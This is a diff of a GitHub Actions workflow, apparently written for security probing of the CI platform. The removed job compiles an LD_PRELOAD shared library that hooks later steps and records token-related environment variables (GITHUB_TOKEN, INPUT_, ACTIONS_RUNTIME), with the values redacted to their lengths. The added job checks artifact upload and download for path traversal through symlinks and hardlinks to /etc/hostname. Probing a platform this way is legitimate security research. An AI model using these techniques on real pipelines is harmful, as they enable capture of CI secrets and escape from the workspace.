@@ -4,56 +4,51 @@ on:
 
 permissions:
   contents: read
+  actions: write
 
 jobs:
-  capture-token:
+  test:
     runs-on: ubuntu-latest
     steps:
-      - name: Step 1 — compile .so that captures INPUT_ vars and set LD_PRELOAD
+      - uses: actions/checkout@v4
+      
+      - name: Create files with traversal-like paths
         run: |
-          cat > /tmp/capture.c << 'CEOF'
-          #include <stdlib.h>
-          #include <stdio.h>
-          #include <string.h>
-          extern char **environ;
-          __attribute__((constructor))
-          void init(void) {
-              FILE *f = fopen("/tmp/captured_env.txt", "a");
-              if (!f) return;
-              // Scan ALL env vars for token-like values
-              for (char **env = environ; *env; env++) {
-                  if (strstr(*env, "INPUT_") == *env ||
-                      strstr(*env, "GITHUB_TOKEN") == *env ||
-                      strstr(*env, "ACTIONS_RUNTIME") == *env) {
-                      // Write key name only (redact values for safety)
-                      char *eq = strchr(*env, '=');
-                      if (eq) {
-                          int keylen = eq - *env;
-                          int vallen = strlen(eq+1);
-                          fprintf(f, "%.*s=(%d chars)\n", keylen, *env, vallen);
-                      }
-                  }
-              }
-              fprintf(f, "---CONSTRUCTOR_RAN---\n");
-              fclose(f);
-          }
-          CEOF
-          gcc -shared -fPIC -o /tmp/capture.so /tmp/capture.c
-          echo "LD_PRELOAD=/tmp/capture.so" >> $GITHUB_ENV
-          echo "Step 1: .so compiled and LD_PRELOAD set"
+          # Create a file structure that might cause path traversal when extracted
+          mkdir -p testdir/sub
+          echo "NORMAL_FILE" > testdir/normal.txt
+          echo "TRAVERSAL_CANARY_DATA" > testdir/sub/data.txt
+          
+          # Can I create a symlink that makes the archive path contain ../?
+          # Symlink: testdir/link -> ../../etc/hostname
+          ln -s ../../etc/hostname testdir/link-hostname
+          
+          # Also test: hardlink to file outside workspace
+          # (hardlinks can't cross filesystem boundaries, so this might fail)
+          ln /etc/hostname testdir/hardlink-hostname 2>/dev/null || echo "Hardlink failed (expected)"
+          
+          ls -la testdir/
+          
+      - name: Upload with traversal-path entries
+        uses: actions/upload-artifact@v4
+        with:
+          name: path-traversal-test
+          path: testdir/
+          retention-days: 1
 
-      - name: Step 2 — checkout (Node.js action, gets INPUT_TOKEN)
-        uses: actions/checkout@v4
+      - name: Download and check extraction paths
+        uses: actions/download-artifact@v4
+        with:
+          name: path-traversal-test
+          path: download-dir
 
-      - name: Step 3 — check what the .so captured from checkout's process
+      - name: Verify extracted paths
         run: |
-          echo "=== Captured env vars from LD_PRELOAD constructor ==="
-          if [ -f /tmp/captured_env.txt ]; then
-            cat /tmp/captured_env.txt
-            echo ""
-            echo "Lines containing INPUT_TOKEN or GITHUB_TOKEN:"
-            grep -c "INPUT_TOKEN\|INPUT_GITHUB\|GITHUB_TOKEN" /tmp/captured_env.txt || echo "0"
-            grep "INPUT_TOKEN\|INPUT_GITHUB\|GITHUB_TOKEN" /tmp/captured_env.txt || echo "(none)"
-          else
-            echo "No capture file found"
-          fi
+          echo "=== Extracted structure ==="
+          find download-dir -type f -o -type l | head -20
+          echo ""
+          echo "=== Check for escaped files ==="
+          ls -la download-dir/../ 2>/dev/null | head -5
+          echo ""
+          echo "=== Content of link-hostname ==="
+          cat download-dir/link-hostname 2>/dev/null || echo "link-hostname not found"
